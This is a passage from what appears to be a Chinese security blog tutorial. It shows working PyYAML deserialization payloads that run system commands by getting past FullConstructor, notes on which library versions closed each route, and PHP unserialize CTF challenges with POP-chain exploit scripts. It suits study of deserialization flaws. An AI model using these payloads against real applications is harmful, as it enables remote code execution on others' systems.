src="http://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/dae3bf71-db1c-4962-aea3-195cbc1f5dd8.png!blog#width-zoom5" alt="img"></a></p><p>可以看到，上面并没有执行命令（只要尝试解开 payload 里的 map 必定会执行命令）。跟踪执行流程并审计源码可以发现，在 <code>make_python_instance</code> 中，这也是为什么我上面说这个条件比较特殊。</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/d8f60d96-f82d-4b91-9b12-735abbbc475b.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/d8f60d96-f82d-4b91-9b12-735abbbc475b.png!blog" alt="img"></a></p><p>可以看到，这里是<strong>通过 <code>cls.__new__</code> 来新建一个 cls 实例的</strong>，因为 FullConstructor 下使用 <code>python/object/new</code> 时，newobj 必定是 <code>True</code>，而后面那个条件必定是满足的，否则上面一个条件就会报错。</p><p>所以到这里我们就可以复现这个 “bug”：</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/58f754f0-a23c-4913-a8dc-ee57f64f3ebc.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/58f754f0-a23c-4913-a8dc-ee57f64f3ebc.png!blog" alt="img"></a></p><p>那么为什么通过 <code>list.__new__</code> 会忽略元素参数，而 <code>tuple.__new__</code> 却不会呢？</p><p>通过审计 Python 的 C 代码，对比 list 和 tuple 的底层实现，大致可以得出这么一个结论：由于 <code>__new__</code> 的调用在 <code>__init__</code> 之前，所以我猜测不可变类型是在 <code>__new__</code> 时插入元素，而可变类型是在 <code>__init__</code> 时插入元素，所以 <code>__new__</code> 时传入的元素参数就被忽略了，而 <code>__init__</code> 又没有接收到元素，所以就生成了一个空的实例。<strong>注意，这个结论由于精力原因，并没有经过严格的考证，若感兴趣橘友们应当自行跟踪调试。</strong></p><p>所以 <strong><code>frozenset</code>、<code>bytes</code> 等这种不可变类型都会解开里面的元素从而触发命令执行，而 <code>dict</code>、<code>bytearray</code> 等这种可变类型就不会</strong>：</p><p>所以可以使用bytes代替tuple</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""!!python/object/new:bytes- !!python/object/new:map  - !!python/name:eval  - ["__import__('os').system('whoami')"]"""</span><span class="token punctuation">)</span><span class="token comment">#过滤system时可以使用Popen</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""!!python/object/new:bytes- !!python/object/new:map  - !!python/name:eval  - ["__import__('os').Popen('whoami')"]"""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/70d23eee-bddc-4ab3-a0a5-a7acfe5932c2.png!blog"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/70d23eee-bddc-4ab3-a0a5-a7acfe5932c2.png!blog" alt="img"></a></p><p>所以，我们只需要找到 触发带参调用 + 引入函数 这两个点就可以完成攻击。在 <code>construct_python_object_apply</code> 中，不仅进行了实例化，如果有 <code>listitems</code> 还会调用实例的 <code>extend</code> 方法，所以原型是：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">exp <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"exp"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"extend"</span><span class="token punctuation">:</span> <span class="token builtin">eval</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>exp<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>YAML payload:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>full_load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""!!python/object/new:typeargs:  - exp  - !!python/tuple []  - &#123;"extend": !!python/name:exec &#125;listitems: "__import__('os').system('whoami')""""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：<br><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/11e9e1a9-eb9c-4cbf-a5b7-b18feef4e286.png!blog#width-zoom7"><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/11e9e1a9-eb9c-4cbf-a5b7-b18feef4e286.png!blog#width-zoom7" alt="img"></a></p><p><code>construct_python_object_apply</code> 中还对实例进行 setstate，即调用了 <code>__setstate__</code>，所以同样的思路，原型：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">exp <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"exp"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__setstate__"</span><span class="token punctuation">:</span> <span class="token builtin">eval</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>exp<span class="token punctuation">.</span>__setstate__<span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>YAML payload:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>full_load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""!!python/object/new:typeargs:  - exp  - !!python/tuple []  - &#123;"__setstate__": !!python/name:eval &#125;state: "__import__('os').system('whoami')""""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 <code>type</code> 也可以用 <code>staticmethod</code> 来替换。例如，在 <code>set_python_instance_state</code> 中，还有个调用 <code>slotstate.update</code> 的逻辑，那么只要将 <code>slotstate.update</code> 置为 <code>eval</code>，<code>state</code> 就是 RCE 的 payload。原型：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">exp <span class="token operator">=</span> <span class="token builtin">staticmethod</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>exp<span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>update<span class="token punctuation">(</span>    <span class="token punctuation">&#123;</span><span class="token string">"update"</span><span class="token punctuation">:</span> <span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token string">"items"</span><span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>exp_raise <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用</span>exp<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>YAML payload:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>full_load<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""!!python/object/new:str    args: []    # 通过 state 触发调用    state: !!python/tuple      - "__import__('os').system('whoami')"      # 下面构造 exp      - !!python/object/new:staticmethod        args: []        state:           update: !!python/name:eval          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功"""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个稍微复杂一些。</p><p>总之这个组合拳用来绕过 FullConstructor 是很简单的。</p><h3 id="版本大于等于-5-2"><a href="#版本大于等于-5-2" class="headerlink" title="版本大于等于 5.2"></a>版本大于等于 5.2</h3><p>FullConstructor 现在只额外支持 <code>!!python/name</code>、<code>!!python/object</code>、<code>!!python/object/new</code> 和 <code>!!python/module</code>，<code>!!python/object/apply</code> G 了。</p><h3 id="版本大于等于-5-3-1"><a href="#版本大于等于-5-3-1" class="headerlink" title="版本大于等于 5.3.1"></a>版本大于等于 5.3.1</h3><p>5.3.1 引入了一个新的过滤机制，本质上就是实现一个属性名黑名单（正则），匹配到就报错。</p><p><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/20220629170947.png!blog"><img src="http://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/20220629170947.png!blog" alt="img"></a></p><p>见：<a href="https://github.com/yaml/pyyaml/pull/386">https://github.com/yaml/pyyaml/pull/386</a></p><p>简单，粗暴。</p><h3 id="版本大于等于-5-4"><a href="#版本大于等于-5-4" class="headerlink" title="版本大于等于 5.4"></a>版本大于等于 5.4</h3><p>FullConstructor 现在只额外支持 <code>!!python/name</code>，<code>!!python/object/apply</code>、<code>!!python/object</code>、<code>!!python/object/new</code> 和 <code>!!python/module</code> 都 G 了。</p><h3 id="版本大于等于-6-0"><a href="#版本大于等于-6-0" class="headerlink" title="版本大于等于 6.0"></a>版本大于等于 6.0</h3><p>现在在使用 <code>yaml.load</code> 时，用户必须指定 Loader。这个改进其实有点强硬，所以引发了一堆 issue，还有人在直接开怼认为这是糟糕的设计。但是至少安全性上来说，相比给一个告警，确实得到了一定提升。</p><h2 id="例题-目标调用hint（）"><a href="#例题-目标调用hint（）" class="headerlink" title="例题:(目标调用hint（）)"></a>例题:(目标调用hint（）)</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">yang</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$y1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">y1</span><span class="token operator">-></span><span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">y1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$hey_mean_then</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">cheng</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c1</span><span class="token operator">-></span><span class="token property">flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c1</span><span class="token operator">-></span><span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bei</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$b1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$k1</span><span class="token punctuation">,</span><span class="token variable">$k2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$n1</span><span class="token punctuation">,</span><span class="token variable">$n2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ans'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ans'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp1.php（调用hint）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">yang</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$y1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$y1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">y1</span> <span class="token operator">=</span> <span class="token variable">$y1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">cheng</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$c1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c1</span> <span class="token operator">=</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bei</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$b1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$b1</span><span class="token punctuation">,</span> <span class="token variable">$b2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b1</span> <span class="token operator">=</span> <span class="token variable">$b1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b2</span> <span class="token operator">=</span> <span class="token variable">$b2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$y2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">yang</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'binbin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">cheng</span><span class="token punctuation">(</span><span class="token variable">$y2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">yang</span><span class="token punctuation">(</span><span class="token variable">$c2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">bei</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'binbin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">cheng</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp2.php(读php)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">yang</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$y1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">cheng</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bei</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$b1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">cheng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">bei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">yang</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">cheng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-></span><span class="token property">c1</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">c1</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">b1</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">y1</span><span class="token operator">=</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p> <a href="https://xz.aliyun.com/t/10961">https://xz.aliyun.com/t/10961</a> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Fun</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'call_user_func_array'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Don't serialize me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"serialize me?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/Test/"</span><span class="token punctuation">,</span><span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"No test in Prod\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token variable">$p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span><span class="token comment">//存在循环引用</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pop</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no 